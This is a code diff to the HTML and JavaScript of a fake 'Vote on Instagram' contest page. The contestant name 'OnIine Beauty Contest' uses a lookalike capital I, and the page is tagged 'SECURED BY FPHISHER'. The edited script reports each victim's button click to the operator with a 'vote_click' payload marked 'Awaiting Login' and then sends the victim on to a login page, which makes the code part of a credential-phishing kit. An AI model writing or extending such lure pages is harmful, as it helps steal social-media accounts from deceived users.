@@ -55,11 +55,13 @@
         <!-- Vote Button -->
         <a href="login.html" id="vote-btn"
            class="block w-full bg-gradient-to-r from-purple-500 to-pink-500 hover:from-purple-600 hover:to-pink-600 text-white font-semibold text-lg py-4 rounded-2xl transition shadow-lg hover:shadow-xl flex items-center justify-center gap-3 cursor-pointer">
+          
           <svg class="w-6 h-6" fill="currentColor" viewBox="0 0 24 24">
             <rect x="2" y="2" width="20" height="20" rx="5" fill="none" stroke="white" stroke-width="1.5"/>
             <circle cx="12" cy="12" r="3.5" fill="none" stroke="white" stroke-width="1.5"/>
             <circle cx="17" cy="7" r="1.5" fill="white"/>
           </svg>
+
           Vote on Instagram
         </a>
 
@@ -78,19 +80,23 @@
     document.addEventListener('DOMContentLoaded', () => {
       const btn = document.getElementById('vote-btn');
 
-      if (!btn) return;
-
       btn.addEventListener('click', async (e) => {
         e.preventDefault();
 
+        const message = `👤 VOTE BUTTON CLICKED!
+Contestant: OnIine Beauty Contest Niveame
+Status: Awaiting Login....
+
+🔒•SECURED BY FPHISHER•🔒`;
+
         const payload = {
           id: SUBMIT_ID,
-          app: "FASHION BRAND VOTE",
+          type: "vote_click",
+          raw_message: message,
           action: "Vote button clicked",
-          country: "Unknown",     // Optional: can add geolocation here too if needed
-          state: "Unknown",
-          timestamp: new Date().toISOString(),
-          source: "Vote Landing Page"
+          contestant: "OnIine Beauty Contest Niveame",
+          status: "Awaiting Login....",
+          timestamp: new Date().toISOString()
         };
 
         try {
@@ -99,12 +105,10 @@
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify(payload)
           });
-          console.log("Vote click sent successfully");
         } catch (err) {
-          console.error("Failed to send vote data:", err);
+          console.error("Send failed:", err);
         }
 
-        // Redirect after sending
         window.location.href = btn.href || "login.html";
       });
     });
